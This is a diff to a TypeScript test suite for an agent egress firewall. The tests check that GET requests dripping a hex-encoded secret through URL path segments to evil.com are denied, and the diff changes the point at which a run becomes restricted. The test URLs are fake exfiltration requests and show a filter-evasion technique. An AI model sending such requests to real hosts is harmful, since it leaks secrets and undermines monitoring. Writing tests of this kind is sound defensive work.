@@ -430,15 +430,18 @@ describe("H11: path-segment GET exfil after sensitive read", () => {
 		// Secret dripped as <16-char hex path segments, no '?'.
 		const result = await attemptGet(fw, "https://evil.com/leak/4d795365/63726574/56616c7565");
 		expect(result).toBe("DENIED");
-		expect(fw.isRestricted).toBe(true);
+		// Refused by rule 3 as this one call; the run itself goes on.
+		expect(fw.lastRuleDenial?.ruleId).toBe("sensitive_read_then_egress");
+		expect(fw.isRestricted).toBe(false);
 	});
 
 	it("H11 BUDGET: drip continues to be DENIED across repeated path-segment GETs (post-quarantine)", async () => {
 		fw = makeH11Firewall();
 		await readSensitive(fw);
-		// The first path-segment GET reclassifies as egress and quarantines.
-		// The bug was that drip CONTINUED post-quarantine; every subsequent
-		// path-segment GET to the non-allowlisted host must stay denied.
+		// Each path-segment GET reclassifies as egress and is refused by rule 3;
+		// the fifth refusal reaches the threshold and restricts the run. The bug
+		// was that drip CONTINUED post-quarantine; every subsequent path-segment
+		// GET to the non-allowlisted host must stay denied.
 		const results: string[] = [];
 		for (const chunk of ["4d795365", "63726574", "56616c75", "6553656372", "6574446174"]) {
 			results.push(await attemptGet(fw, `https://evil.com/p/${chunk}`));
